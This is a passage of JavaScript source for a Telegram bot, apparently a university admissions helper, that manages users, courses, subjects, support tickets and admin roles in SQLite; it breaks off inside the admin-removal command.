//PedPRBot (working name)
//by alexavil, 2022
//Licensed by MIT License
//The lead developer keeps the right to modify or disable the service at any given time.

const TelegramBot = require('node-telegram-bot-api');
const { VK, API } = require('vk-io');
const fs = require('fs');
const sql = require('better-sqlite3');
const token = process.env.TOKEN || process.argv[2];
const adminid = process.env.ADMINID || process.argv[3];
const bot = new TelegramBot(token, { polling: true, onlyFirstMatch: true });
const child = require('child_process');

var defaultlang = process.env.DEF_LANG || process.argv[4];
var locales = ["en", "ru"];

function getLocale(id, defaultlang) {
    var user = settings.prepare('SELECT language FROM users WHERE id = ?').get(id);
    if (user) {
        return user.language;
    } else {
        return defaultlang;
    }
}

function adminCheck(id) {
    //Get user status from the database
    var user = settings.prepare('SELECT status FROM users WHERE id = ?').get(id);
    if (user) {
        console.log(user.status);
        if (user.status == "admin" || user.status == "superadmin") {
            return true;
        } else {
            return false;
        }
    }
}

function superadminCheck(id) {
    //Get user status from the database
    var user = settings.prepare('SELECT status FROM users WHERE id = ?').get(id);
    if (user) {
        if (user.status == "superadmin") {
            return true;
        } else {
            return false;
        }
    }
}

let settings = new sql('settings.db');
settings.prepare("create table if not exists settings (option text UNIQUE, value text)").run();
settings.prepare("create table if not exists users (id INTEGER UNIQUE, is_subscribed text, is_contactbanned text, is_banned text, status text, language text)").run();
settings.prepare("create table if not exists courses (id INTEGER UNIQUE, name text, subjects text, min_score INTEGER, budget text)").run();
settings.prepare("create table if not exists subjects (id INTEGER PRIMARY KEY, name text)").run();
if (adminid != "") {
    settings.prepare("insert or ignore into users values (?, ?, ?, ?, ?, ?)").run(adminid, "false", "false", "false", "superadmin", defaultlang);
}
settings.prepare("insert or ignore into settings (option, value) values ('contact_channel', '')").run();
settings.prepare("insert or ignore into settings (option, value) values ('sub_channel', '')").run();
settings.prepare("insert or ignore into settings (option, value) values ('vk_token', '')").run();
settings.prepare("insert or ignore into settings (option, value) values ('vk_group', '')").run();
settings.prepare("insert or ignore into settings (option, value) values ('calculator', 'true')").run();
settings.prepare("insert or ignore into settings (option, value) values ('subscribe', 'true')").run();
settings.prepare("insert or ignore into settings (option, value) values ('contact', 'true')").run();

locales.forEach(locale => {
    var messages = JSON.parse(fs.readFileSync('./messages_' + locale + '.json'));
    settings.prepare(`insert or ignore into settings (option, value) values ('welcome_text_${locale}', ?)`).run(messages.messages.greeting_default);
    settings.prepare(`insert or ignore into settings (option, value) values ('faq_text_${locale}', ?)`).run(messages.messages.faq_default);
    settings.prepare(`insert or ignore into settings (option, value) values ('webbutton_text_${locale}', ?)`).run(messages.messages.webopen_default);
    settings.prepare(`insert or ignore into settings (option, value) values ('website_link_${locale}', 'https://aguickers.github.io/AGUickers_WebStock/${locale}/')`).run();
});

//This sucks as it doesn't account for different languages and courses
//var subjects = ["Русский язык", "Математика", "Обществознание", "География", "Биология", "Химия", "Иностранный язык", "Информатика", "История", "Литература"];

//User commands

bot.onText(/\/start/, (msg, match) => {
    const chatId = msg.chat.id;
    console.log(msg.from.id);
    //Return if not a private channel
    if (msg.chat.type != "private") return;
    //Add a new user to the users table of the database if the entry doesn't exist
    settings.prepare("INSERT OR IGNORE INTO users VALUES(?,?,?,?,?,?)").run(msg.from.id, "false", "false", "false", "user", defaultlang);
    //Send messages
    //Get welcome message from the database
    var welcome = settings.prepare("SELECT value FROM settings WHERE option = 'welcome_text_" + getLocale(msg.from.id, defaultlang) + "'").get();
    var buttontext = settings.prepare("SELECT value FROM settings WHERE option = 'webbutton_text_" + getLocale(msg.from.id, defaultlang) + "'").get();
    var website = settings.prepare("SELECT value FROM settings WHERE option = 'website_link_" + getLocale(msg.from.id, defaultlang) + "'").get();
    bot.sendMessage(chatId, welcome.value);
    if (website.value != "") {
        bot.setChatMenuButton({
            chat_id: msg.chat.id,
            menu_button: JSON.stringify({ type: "web_app", text: buttontext.value, web_app: { url: website.value } })
        })
    }
});

bot.onText(/\/help/, (msg, match) => {
    const chatId = msg.chat.id;
    var contactchannelid = settings.prepare("SELECT value FROM settings WHERE option = 'contact_channel'").get();
    var messages = JSON.parse(fs.readFileSync('./messages_' + getLocale(msg.from.id, defaultlang) + '.json'));
    if (chatId != contactchannelid.value) bot.sendMessage(chatId, messages.messages.help);
    else bot.sendMessage(chatId, messages.messages.help_contact);
});

bot.onText(/\/faq/, (msg, match) => {
    const chatId = msg.chat.id;
    //Get faq message from the database
    var faq = settings.prepare("SELECT value FROM settings WHERE option = 'faq_text_" + getLocale(msg.from.id, defaultlang) + "'").get();
    bot.sendMessage(chatId, faq.value);
});


bot.onText(/\/newticket/, (msg, match) => {
    const chatId = msg.chat.id;
    if (msg.chat.type != "private") return;
    var contactchannelid = settings.prepare("SELECT value FROM settings WHERE option = 'contact_channel'").get().value;
    if (!contactchannelid || contactchannelid == undefined) return bot.sendMessage(chatId, messages.messages.no_contact_channel);
    var messages = JSON.parse(fs.readFileSync('./messages_' + getLocale(msg.from.id, defaultlang) + '.json'));
    //If the module is disabled, return
    if (settings.prepare("SELECT value FROM settings WHERE option = 'contact'").get().value == "false") return;
    //If the user is banned, send a message and return
    if (settings.prepare("SELECT is_contactbanned FROM users WHERE id = ?").get(msg.from.id).is_contactbanned == "true") return bot.sendMessage(chatId, messages.messages.banned);
    //Prompt the user to enter their message
    bot.sendMessage(chatId, messages.messages.contact_prompt);
    bot.once("message", (msg) => {
        if (msg.text == "/cancel") {
            return bot.sendMessage(chatId, messages.messages.cancelled);
        }
        //Forward the message to the contact channel
        bot.forwardMessage(contactchannelid, msg.chat.id, msg.message_id);
        //Send a confirmation message
        return bot.sendMessage(chatId, messages.messages.contact_sent);
    });
});

bot.onText(/\/calculator/, (msg, match) => {
    var messages = JSON.parse(fs.readFileSync('./messages_' + getLocale(msg.from.id, defaultlang) + '.json'));
    //If toggled off, return
    if (settings.prepare("SELECT value FROM settings WHERE option = 'calculator'").get().value == "false") return;
    //Get all the subjects from the database
    var subjects = settings.prepare("SELECT name FROM subjects").all();
    if (subjects.length == 0) return bot.sendMessage(msg.chat.id, messages.messages.no_subjects);
    //Send a poll with the subjects as options
    bot.sendPoll(msg.chat.id, messages.messages.choose, subjects.map(subject => subject.name), {
        "allows_multiple_answers": true,
        "is_anonymous": false
    });
    bot.once('poll_answer', (ans) => {   
        console.log(ans.option_ids)
        //Split the option_ids into an array
        var option_ids = ans.option_ids.toString().split(",");
        var count = 0;
        //Get all courses
        var courses = settings.prepare("SELECT * FROM courses").all();
        if (courses.length == 0) return bot.sendMessage(msg.from.id, messages.messages.no_courses);
        //For each course
        courses.forEach(course => {
            var subjects = course.subjects.split(",");
            var is_in = true;
            for (var i = 0; i < subjects.length; i++) {
                if (!option_ids.includes(subjects[i])) {
                    is_in = false;
                }
            }
            if (is_in) {
                count = count + 1;
                var ready = messages.messages.coursefield1 + course.name + "\n" + messages.messages.coursefield2  + course.min_score + "\n" + messages.messages.coursefield3 + course.budget;
                return bot.sendMessage(msg.from.id, ready);
            }
        });
    });
});

bot.onText(/\/business/, (msg, match) => {
    const chatId = msg.chat.id;
    var messages = JSON.parse(fs.readFileSync('./messages_' + getLocale(msg.from.id, defaultlang) + '.json'));
    if (msg.chat.type != "private") return;
    //Placeholder - will provide jobs information
    bot.sendMessage(chatId, messages.messages.placeholder);
});

bot.onText(/\/subscribe/, (msg, match) => {
    const chatId = msg.chat.id;
    if (msg.chat.type != "private") return;
    var messages = JSON.parse(fs.readFileSync('./messages_' + getLocale(msg.from.id, defaultlang) + '.json'));
    //If toggled off, return
    if (settings.prepare("SELECT value FROM settings WHERE option = 'subscribe'").get().value == "false") return;
    //Check if the user is already subscribed
    if (settings.prepare("SELECT is_subscribed FROM users WHERE id = ?").get(msg.from.id).is_subscribed == "true") return bot.sendMessage(chatId, messages.messages.subscribe_already);
    //Change the user status
    settings.prepare("UPDATE users SET is_subscribed = 'true' WHERE id = ?").run(msg.from.id);
    //Send a message
    return bot.sendMessage(chatId, messages.messages.subscribe_success);
});

bot.onText(/\/unsubscribe/, (msg, match) => {
    const chatId = msg.chat.id;
    if (msg.chat.type != "private") return;
    var messages = JSON.parse(fs.readFileSync('./messages_' + getLocale(msg.from.id, defaultlang) + '.json'));
    //If toggled off, return
    if (settings.prepare("SELECT value FROM settings WHERE option = 'subscribe'").get().value == "false") return;
    //Check if the user is already unsubscribed
    if (settings.prepare("SELECT is_subscribed FROM users WHERE id = ?").get(msg.from.id).is_subscribed == "false") return bot.sendMessage(chatId, messages.messages.unsubscribe_already);
    //Change the user status
    settings.prepare("UPDATE users SET is_subscribed = 'false' WHERE id = ?").run(msg.from.id);
    //Send a message
    return bot.sendMessage(chatId, messages.messages.unsubscribe_success);
});

bot.onText(/\/language/, (msg, match) => {
    var messages = JSON.parse(fs.readFileSync('./messages_' + getLocale(msg.from.id) + '.json'));
    bot.sendMessage(msg.chat.id, messages.messages.locale_prompt, {
        reply_markup: {
            inline_keyboard: [
                [{text: messages.messages.locale_en, callback_data: 'en'}],
                [{text: messages.messages.locale_ru, callback_data: 'ru'}]
            ]
        }
    });
    bot.once('callback_query', (callbackQuery) => {
        settings.prepare('UPDATE users SET language = ? WHERE id = ?').run(callbackQuery.data, msg.from.id);
        bot.sendMessage(msg.from.id, messages.messages.language_changed);
        var buttontext = settings.prepare("SELECT value FROM settings WHERE option = 'webbutton_text_" + getLocale(msg.from.id, defaultlang) + "'").get();
        var website = settings.prepare("SELECT value FROM settings WHERE option = 'website_link_" + getLocale(msg.from.id, defaultlang) + "'").get();
        if (website.value != "") {
            bot.setChatMenuButton({
                chat_id: msg.chat.id,
                menu_button: JSON.stringify({ type: "web_app", text: buttontext.value, web_app: { url: website.value } })
            })
        }
    });
});

//Contact channel commands

//Deprecated.
/*bot.onText(/\/reply (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const args = msg.text.slice(7).split(' ');
    console.log(args[0].length);
    if (chatId != contactchannelid) return;
    bot.sendMessage(args[0], match.input.slice(args[0].length + 7, match.input.length));
});*/

//ID command: gets the ID of the user who sent the message
bot.onText(/\/id/, (msg, match) => {
    var contactchannelid = settings.prepare("SELECT value FROM settings WHERE option = 'contact_channel'").get().value;
    const chatId = msg.chat.id;
    if (chatId != contactchannelid) return;
    //Only works if we're replying to a message
    if (msg.reply_to_message == undefined) return;
    bot.sendMessage(chatId, msg.reply_to_message.forward_from.id);
});


bot.onText(/\/ban (.+)/, (msg, match) => {
    var contactchannelid = settings.prepare("SELECT value FROM settings WHERE option = 'contact_channel'").get().value;
    const chatId = msg.chat.id;
    const args = msg.text.slice(5).split(' ');
    console.log(args[0].length);
    console.log(args[0]);
    var messages = JSON.parse(fs.readFileSync('./messages_' + getLocale(args[0], defaultlang) + '.json'));
    if (chatId != contactchannelid) return;
    bot.sendMessage(args[0], messages.messages.banned);
    settings.prepare("UPDATE users SET is_contactbanned = 'true' WHERE id = ?").run(args[0]);
});

bot.onText(/\/unban (.+)/, (msg, match) => {
    var contactchannelid = settings.prepare("SELECT value FROM settings WHERE option = 'contact_channel'").get().value;
    const chatId = msg.chat.id;
    const args = msg.text.slice(7).split(' ');
    console.log(args[0].length);
    var messages = JSON.parse(fs.readFileSync('./messages_' + getLocale(args[0], defaultlang) + '.json'));
    if (chatId != contactchannelid) return;
    bot.sendMessage(args[0], messages.messages.unbanned);
    settings.prepare("UPDATE users SET is_contactbanned = 'false' WHERE id = ?").run(args[0]);
});



//Admin commands

//Toggle modules (calculator, contact, subscription)
bot.onText(/\/toggle/, (msg, match) => {
    const chatId = msg.chat.id;
    var messages = JSON.parse(fs.readFileSync('./messages_' + getLocale(msg.from.id, defaultlang) + '.json'));
    if (msg.chat.type != "private") return;
    if (adminCheck(msg.from.id) == false) return;
    bot.sendMessage(chatId, messages.messages.toggle_prompt, {
        "reply_markup": {
            "inline_keyboard": [
                [{
                    "text": messages.messages.calc_name,
                    "callback_data": "toggle_calculator"
                }],
                [{
                    "text": messages.messages.contact_name,
                    "callback_data": "toggle_contact"
                }],
                [{
                    "text": messages.messages.subscribe_name,
                    "callback_data": "toggle_subscribe"
                }]
            ]
        }
    });
    bot.once('callback_query', (callbackQuery) => {
        var option = callbackQuery.data.slice(7, callbackQuery.data.length);
        console.log(option)
        //Search for the option in the database
        var value = settings.prepare("SELECT value FROM settings WHERE option = ?").get(option);
        console.log(value.value);
        if (value.value == "true") {
            settings.prepare("UPDATE settings SET value = 'false' WHERE option = ?").run(option);
            bot.answerCallbackQuery(callbackQuery.id, messages.messages.toggled_off);
            bot.sendMessage(chatId, messages.messages.toggled_off);
        } else {
            settings.prepare("UPDATE settings SET value = 'true' WHERE option = ?").run(option);
            bot.answerCallbackQuery(callbackQuery.id, messages.messages.toggled_on);
            bot.sendMessage(chatId, messages.messages.toggled_on);
        }
    });
});

bot.onText(/\/adminhelp/, (msg, match) => {
    const chatId = msg.chat.id;
    var messages = JSON.parse(fs.readFileSync('./messages_' + getLocale(msg.from.id, defaultlang) + '.json'));
    if (msg.chat.type != "private") return;
    if (adminCheck(msg.from.id) == false) return;
    bot.sendMessage(chatId, messages.messages.help_admin);
    if (superadminCheck(msg.from.id)) bot.sendMessage(chatId, messages.messages.help_superadmin);
});

bot.onText(/\/contactchannel/, (msg, match) => {
    var contactchannelid = settings.prepare("SELECT value FROM settings WHERE option = 'contact_channel'").get().value;
    const chatId = msg.chat.id;
    var messages = JSON.parse(fs.readFileSync('./messages_' + getLocale(msg.from.id, defaultlang) + '.json'));
    if (adminCheck(msg.from.id) == false) return;
    if (msg.chat.type == "private") {
        return bot.sendMessage(chatId, messages.messages.channel_get + contactchannelid);
    } else {
        settings.prepare("UPDATE settings SET value = ? WHERE option = 'contact_channel'").run(chatId);
        return bot.sendMessage(chatId, messages.messages.channel_success);
    }
});

bot.onText(/\/resetcontact/, (msg, match) => {
    const chatId = msg.chat.id;
    var contactchannelid = settings.prepare("SELECT value FROM settings WHERE option = 'contact_channel'").get().value;
    var messages = JSON.parse(fs.readFileSync('./messages_' + getLocale(msg.from.id, defaultlang) + '.json'));
    if (adminCheck(msg.from.id) == false) return;
    if (msg.chat.type != "private") return;
    settings.prepare("UPDATE settings SET value = ? WHERE option = 'contact_channel'").run("");
    return bot.sendMessage(chatId, messages.messages.channel_reset);
});

//Set subscribe channel

//Telegram can't accept commands in a channel, so this is deprecated
/*bot.onText(/\/subscribechannel/, (msg, match) => {
    const chatId = msg.chat.id;
    if (msg.chat.type == "private") return;
    var statusquery = "SELECT status FROM users WHERE id = ?";
    settings.get(statusquery, [msg.from.id], (err, row) => {
        if (err) {
            return console.error(err.message);
        }
        if (row.status == "admin" || row.status == "developer") {
            settings.run(`UPDATE settings SET value=? WHERE option=?`, [chatId, "sub_channel"], function (err) {
                if (err) {
                    return console.log(err.message);
                }
                bot.sendMessage(chatId, messages.messages.subchannel_success);
                subchannelid = chatId; //updating the local value in case someone decides to edit the channel while the bot is running
            });
        }
    });
});
*/

//Reset subscribe channel
bot.onText(/\/resetsub/, (msg, match) => {
    const chatId = msg.chat.id;
    var messages = JSON.parse(fs.readFileSync('./messages_' + getLocale(msg.from.id, defaultlang) + '.json'));
    if (msg.chat.type != "private") return;
    if (adminCheck(msg.from.id) == false) return;
    settings.prepare("UPDATE settings SET value = ? WHERE option = 'sub_channel'").run("");
    return bot.sendMessage(chatId, messages.messages.subchannel_reset);
});

bot.onText(/\/addcourse/, (msg, match) => {
    var messages = JSON.parse(fs.readFileSync('./messages_' + getLocale(msg.from.id, defaultlang) + '.json'));
    var id = "";
    var name = "";
    var reqsubjects = [];
    var score = "";
    var budget = "";
    const chatId = msg.chat.id;
    if (msg.chat.type != "private") return;
    if (adminCheck(msg.from.id) == false) return;
    //Get all subjects from the database
    var subjects = settings.prepare("SELECT * FROM subjects").all();
    //If no subjects are found, return
    if (subjects.length == 0) {
        return bot.sendMessage(chatId, messages.messages.no_subjects);
    }
    //Ask for the course name
    bot.sendMessage(chatId, messages.messages.course_prompt);
    bot.once("message", (msg) => {
        if (msg.text == "/cancel") {
            return bot.sendMessage(chatId, messages.messages.cancelled);
        }
        name = msg.text;
        //Create a poll for the subjects
        bot.sendPoll(chatId, messages.messages.choose, subjects.map(subject => subject.name), {
            "allows_multiple_answers": true,
            "is_anonymous": false
        });
        bot.once("poll_answer", (ans) => {
            id = ans.poll_id;
            reqsubjects = ans.option_ids.toString();
            //Ask for the score
            bot.sendMessage(chatId, messages.messages.score_prompt);
            bot.once("message", (msg) => {
                if (msg.text == "/cancel") {
                    return bot.sendMessage(chatId, messages.messages.cancelled);
                }
                score = msg.text;
                //Prompt for the budget places
                bot.sendMessage(chatId, messages.messages.budget_prompt);
                bot.once("message", (msg) => {
                    if (msg.text == "/cancel") {
                        return bot.sendMessage(chatId, messages.messages.cancelled);
                    }
                    budget = msg.text;
                    //Insert the course into the database
                    settings.prepare("INSERT INTO courses VALUES(?,?,?,?,?)").run(id, name, reqsubjects, score, budget);
                    return bot.sendMessage(chatId, messages.messages.course_added);
                });
            });
        });
    });
});


bot.onText(/\/delcourse/, (msg, match) => {
    const chatId = msg.chat.id;
    var messages = JSON.parse(fs.readFileSync('./messages_' + getLocale(msg.from.id, defaultlang) + '.json'));
    if (msg.chat.type != "private") return;
    if (adminCheck(msg.from.id) == false) return;
    //Get all courses from the database
    var courses = settings.prepare("SELECT * FROM courses").all();
    //If no courses are found, return
    if (courses.length == 0) {
        return bot.sendMessage(chatId, messages.messages.no_courses);
    }
    //Create a keyboard with all courses
    var keyboard = [];
    for (var i = 0; i < courses.length; i++) {
        keyboard.push([{text: courses[i].name, callback_data: courses[i].name}]);
    }
    bot.sendMessage(chatId, messages.messages.delcourse_prompt, {
        reply_markup: {
            inline_keyboard: keyboard
        }
    });
    bot.once("callback_query", (msg) => {
        //Delete the course from the database
        settings.prepare("DELETE FROM courses WHERE name = ?").run(msg.data);
        return bot.sendMessage(chatId, messages.messages.course_deleted);
    });
});

bot.onText(/\/listcourses/, (msg, match) => {
    const chatId = msg.chat.id;
    var messages = JSON.parse(fs.readFileSync('./messages_' + getLocale(msg.from.id, defaultlang) + '.json'));
    if (msg.chat.type != "private") return;
    if (adminCheck(msg.from.id) == false) return;
    //Get all courses from the database
    var courses = settings.prepare("SELECT * FROM courses").all();
    //If no courses are found, return
    if (courses.length == 0) {
        return bot.sendMessage(chatId, messages.messages.no_courses);
    }
    //Send a message with all courses
    var message = "";
    for (var i = 0; i < courses.length; i++) {
        message += courses[i].id + "-" + courses[i].name + "\n";
    }
    return bot.sendMessage(chatId, message);
});

//Course Editor
bot.onText(/\/editcourse/, (msg, match) => {
    const chatId = msg.chat.id;
    var id = "";
    var messages = JSON.parse(fs.readFileSync('./messages_' + getLocale(msg.from.id, defaultlang) + '.json'));
    if (msg.chat.type != "private") return;
    if (adminCheck(msg.from.id) == false) return;
    //Get all courses from the database
    var courses = settings.prepare("SELECT * FROM courses").all();
    //If no courses are found, return
    if (courses.length == 0) {
        return bot.sendMessage(chatId, messages.messages.no_courses);
    }
    //Create a keyboard with all courses
    var keyboard = [];
    for (var i = 0; i < courses.length; i++) {
        keyboard.push([{text: courses[i].name, callback_data: courses[i].name}]);
    }
    bot.sendMessage(chatId, messages.messages.editcourse_prompt, {
        reply_markup: {
            inline_keyboard: keyboard
        }
    });
    bot.once("callback_query", (msg) => {
        id = msg.data;
        //Get the course from the database
        var course = settings.prepare("SELECT * FROM courses WHERE name = ?").get(id);
        //Ask, which field to edit
        bot.sendMessage(chatId, messages.messages.editcourse_field_prompt, {
            reply_markup: {
                inline_keyboard: [
                    [{
                        text: messages.messages.field_name,
                        callback_data: "name"
                    }],
                    [{
                        text: messages.messages.field_subjects,
                        callback_data: "subjects"
                    }],
                    [{
                        text: messages.messages.field_score,
                        callback_data: "min_score"
                    }],
                    [{
                        text: messages.messages.field_budget,
                        callback_data: "budget"
                    }]
                ]
            }
        });
                bot.once("callback_query", (msg) => {
                    switch (msg.data) {
                        case "subjects":
                            //Get all subjects from the database
                            var subjects = settings.prepare("SELECT * FROM subjects").all();
                            bot.sendPoll(chatId, messages.messages.choose, subjects.map(subject => subject.name), {
                                "allows_multiple_answers": true,
                                "is_anonymous": false
                            });
                            bot.once("poll_answer", (msg) => {
                                //Edit the subjects
                                console.log(id);
                                console.log(msg.option_ids.toString());
                                settings.prepare("UPDATE courses SET subjects = ? WHERE name = ?").run(msg.option_ids.toString(), id);
                                return bot.sendMessage(chatId, messages.messages.course_edited);
                            });
                            break;
                            default:
                                var query = "UPDATE courses SET " + msg.data + " = ? WHERE name = ?";
                                bot.sendMessage(chatId, messages.messages.editcourse_value_prompt);
                                bot.once("message", (msg) => {
                                    if (msg.text == "/cancel") {
                                        return bot.sendMessage(chatId, messages.messages.cancelled);
                                    }
                                    //Edit the field
                                    settings.prepare(query).run(msg.text, id);
                                    return bot.sendMessage(chatId, messages.messages.course_edited);
                                });
                                break;
                    }
                });
            });
});


//Subject commands: add, del, list
bot.onText(/\/addsubject/, (msg, match) => {
    const chatId = msg.chat.id;
    var messages = JSON.parse(fs.readFileSync('./messages_' + getLocale(msg.from.id, defaultlang) + '.json'));
    if (msg.chat.type != "private") return;
    if (adminCheck(msg.from.id) == false) return;
    //Prompt for the subject name
    bot.sendMessage(chatId, messages.messages.addsubject_prompt);
    bot.once("message", (msg) => {
        if (msg.text == "/cancel") {
            return bot.sendMessage(chatId, messages.messages.cancelled);
        }
        //Add the subject to the database
        settings.prepare("INSERT INTO subjects (name) VALUES (?)").run(msg.text);
        return bot.sendMessage(chatId, messages.messages.subject_added);
    });
});

bot.onText(/\/delsubject/, (msg, match) => {
    const chatId = msg.chat.id;
    var messages = JSON.parse(fs.readFileSync('./messages_' + getLocale(msg.from.id, defaultlang) + '.json'));
    if (msg.chat.type != "private") return;
    if (adminCheck(msg.from.id) == false) return;
    //Get all subjects from the database
    var subjects = settings.prepare("SELECT * FROM subjects").all();
    //If no subjects are found, return
    if (subjects.length == 0) {
        return bot.sendMessage(chatId, messages.messages.no_subjects);
    }
    //Create a keyboard with all subjects
    var keyboard = [];
    for (var i = 0; i < subjects.length; i++) {
        keyboard.push({text: subjects[i].name, callback_data: subjects[i].id});
    }
    bot.sendMessage(chatId, messages.messages.delsubject_prompt, {
        reply_markup: {
            inline_keyboard: keyboard
        }
    });
    bot.once("callback_query", (msg) => {
        //Get the subject from the database
        var subject = settings.prepare("SELECT * FROM subjects WHERE id = ?").get(msg.data);
        //Delete the subject
        settings.prepare("DELETE FROM subjects WHERE id = ?").run(msg.data);
        return bot.sendMessage(chatId, messages.messages.subject_deleted);
    });
});

bot.onText(/\/listsubjects/, (msg, match) => {
    const chatId = msg.chat.id;
    var messages = JSON.parse(fs.readFileSync('./messages_' + getLocale(msg.from.id, defaultlang) + '.json'));
    if (msg.chat.type != "private") return;
    if (adminCheck(msg.from.id) == false) return;
    //Get all subjects from the database
    var subjects = settings.prepare("SELECT * FROM subjects").all();
    //If no subjects are found, return
    if (subjects.length == 0) {
        return bot.sendMessage(chatId, messages.messages.no_subjects);
    }
    //Send a message with all subjects
    var message = "";
    for (var i = 0; i < subjects.length; i++) {
        message += subjects[i].name + "\n";
    }
    return bot.sendMessage(chatId, message);
});

//Set welcome message
bot.onText(/\/setwelcome/, (msg, match) => {
    const chatId = msg.chat.id;
    var messages = JSON.parse(fs.readFileSync('./messages_' + getLocale(msg.from.id, defaultlang) + '.json'));
    if (msg.chat.type != "private") return;
    if (adminCheck(msg.from.id) == false) return;
    //Prompt for the locale
    bot.sendMessage(chatId, messages.messages.locale_prompt, {
        reply_markup: {
            inline_keyboard: [
                [{
                    text: messages.messages.locale_en,
                    callback_data: "en"
                }],
                [{
                    text: messages.messages.locale_ru,
                    callback_data: "ru"
                }]
            ]
        }
    });
    bot.once("callback_query", (callback) => {
        //Prompt for the message
        bot.sendMessage(chatId, messages.messages.setwelcome_message_prompt);
        bot.once("message", (msg) => {
            if (msg.text == "/cancel") {
                return bot.sendMessage(chatId, messages.messages.cancelled);
            }
            //Set the welcome message
            settings.prepare("UPDATE settings SET value = ? WHERE option = ?").run(msg.text, "welcome_text_" + callback.data);
            return bot.sendMessage(chatId, messages.messages.welcome_message_set);
        });
    });
});

//Set FAQ message
bot.onText(/\/setfaq/, (msg, match) => {
    const chatId = msg.chat.id;
    var messages = JSON.parse(fs.readFileSync('./messages_' + getLocale(msg.from.id, defaultlang) + '.json'));
    if (msg.chat.type != "private") return;
    if (adminCheck(msg.from.id) == false) return;
    //Prompt for the locale
    bot.sendMessage(chatId, messages.messages.locale_prompt, {
        reply_markup: {
            inline_keyboard: [
                [{
                    text: messages.messages.locale_en,
                    callback_data: "en"
                }],
                [{
                    text: messages.messages.locale_ru,
                    callback_data: "ru"
                }]
            ]
        }
    });
    bot.once("callback_query", (callback) => {
        //Prompt for the message
        bot.sendMessage(chatId, messages.messages.setfaq_message_prompt);
        bot.once("message", (msg) => {
            if (msg.text == "/cancel") {
                return bot.sendMessage(chatId, messages.messages.cancelled);
            }
            //Set the welcome message
            settings.prepare("UPDATE settings SET value = ? WHERE option = ?").run(msg.text, "faq_text_" + callback.data);
            return bot.sendMessage(chatId, messages.messages.faq_message_set);
        });
    });

});

//Set button text
bot.onText(/\/setbutton/, (msg, match) => {
    const chatId = msg.chat.id;
    var messages = JSON.parse(fs.readFileSync('./messages_' + getLocale(msg.from.id, defaultlang) + '.json'));
    if (msg.chat.type != "private") return;
    if (adminCheck(msg.from.id) == false) return;
        bot.sendMessage(chatId, messages.messages.locale_prompt, {
            reply_markup: {
                inline_keyboard: [
                    [{
                        text: messages.messages.locale_en,
                        callback_data: "en"
                    }],
                    [{
                        text: messages.messages.locale_ru,
                        callback_data: "ru"
                    }]
                ]
            }
        });
        bot.once("callback_query", (callback) => {
            //Prompt for the message
            bot.sendMessage(chatId, messages.messages.button_text_prompt);
            bot.once("message", (msg) => {
                if (msg.text == "/cancel") {
                    return bot.sendMessage(chatId, messages.messages.cancelled);
                }
                //Set the welcome message
                settings.prepare("UPDATE settings SET value = ? WHERE option = ?").run(msg.text, "webbutton_text_" + callback.data);
                var buttontext = settings.prepare("SELECT value FROM settings WHERE option = 'webbutton_text_" + getLocale(msg.from.id, defaultlang) + "'").get();
                var website = settings.prepare("SELECT value FROM settings WHERE option = 'website_link_" + getLocale(msg.from.id, defaultlang) + "'").get();
                if (website.value != "") {
                    bot.setChatMenuButton({
                        chat_id: msg.chat.id,
                        menu_button: JSON.stringify({ type: "web_app", text: buttontext.value, web_app: { url: website.value } })
                    })
                }
                return bot.sendMessage(chatId, messages.messages.button_text_set);
            });
        });
});

bot.onText(/\/setwebsite/, (msg, match) => {
    const chatId = msg.chat.id;
    var messages = JSON.parse(fs.readFileSync('./messages_' + getLocale(msg.from.id, defaultlang) + '.json'));
    if (msg.chat.type != "private") return;
    if (adminCheck(msg.from.id) == false) return;
    bot.sendMessage(chatId, messages.messages.locale_prompt, {
        reply_markup: {
            inline_keyboard: [
                [{
                    text: messages.messages.locale_en,
                    callback_data: "en"
                }],
                [{
                    text: messages.messages.locale_ru,
                    callback_data: "ru"
                }]
            ]
        }
    });
    bot.once("callback_query", (callback) => {
        //Prompt for the message
        bot.sendMessage(chatId, messages.messages.website_prompt);
        bot.once("message", (msg) => {
            if (msg.text == "/cancel") {
                return bot.sendMessage(chatId, messages.messages.cancelled);
            }
            if (!msg.text.startsWith("https://")) {
                //Telegram only accepts HTTPS sites as web apps
                return bot.sendMessage(chatId, messages.messages.website_invalid);
            }
            //Set the welcome message
            settings.prepare("UPDATE settings SET value = ? WHERE option = ?").run(msg.text, "website_link_" + callback.data);
            var buttontext = settings.prepare("SELECT value FROM settings WHERE option = 'webbutton_text_" + getLocale(msg.from.id, defaultlang) + "'").get();
            var website = settings.prepare("SELECT value FROM settings WHERE option = 'website_link_" + getLocale(msg.from.id, defaultlang) + "'").get();
            if (website.value != "") {
                bot.setChatMenuButton({
                    chat_id: msg.chat.id,
                    menu_button: JSON.stringify({ type: "web_app", text: buttontext.value, web_app: { url: website.value } })
                })
            }
            return bot.sendMessage(chatId, messages.messages.website_set);
        });
    });
});

//Admin management commands: add, del, transfer ownership
bot.onText(/\/addadmin/, (msg, match) => {
    const chatId = msg.chat.id;
    var messages = JSON.parse(fs.readFileSync('./messages_' + getLocale(msg.from.id, defaultlang) + '.json'));
    if (msg.chat.type != "private") return;
    if (superadminCheck(msg.from.id) == false) return;
    //Prompt for the admin's id
    bot.sendMessage(chatId, messages.messages.addadmin_prompt);
    bot.once("message", (msg) => {
        if (msg.text == "/cancel") {
            return bot.sendMessage(chatId, messages.messages.cancelled);
        }
        //If the user is already an admin, return
        if (adminCheck(msg.text) == true) {
            return bot.sendMessage(chatId, messages.messages.already_admin);
        }
        //If the user is not found, return
        var user = settings.prepare("SELECT * FROM users WHERE id = ?").get(msg.text);
        if (user == undefined) {
            return bot.sendMessage(chatId, messages.messages.user_not_found);
        }
        //Edit the user status
        settings.prepare("UPDATE users SET status = ? WHERE id = ?").run("admin", msg.text);
        return bot.sendMessage(chatId, messages.messages.admin_added);
    });
});

bot.onText(/\/deladmin/, (msg, match) => {
    const chatId = msg.chat.id;
    var messages = JSON.parse(fs.readFileSync('./messages_' + getLocale(msg.from.id, defaultlang) + '.json'));
    if (msg.chat.type != "private") return;
    if (superadminCheck(msg.from.id) == false) return;
    //Get all admins from the database
    var admins = settings.prepare("SELECT * FROM users WHERE status = ?").all("admin");
    //If no admins are found, return
    if (admins.length == 0) {
        return bot.sendMessage(chatId, messages.messages.no_admins);
    }
    //Create a keyboard with all admins
    var keyboard = [];
    for (var i = 0; i < admins.length; i++) {
        keyboard.push({text: admins[i].name, callback_data: admins[i].id});
    }
    bot.sendMessage(chatId, messages.messages.deladmin_prompt, {
        reply_markup: {
            inline_keyboard: keyboard
        }
    });
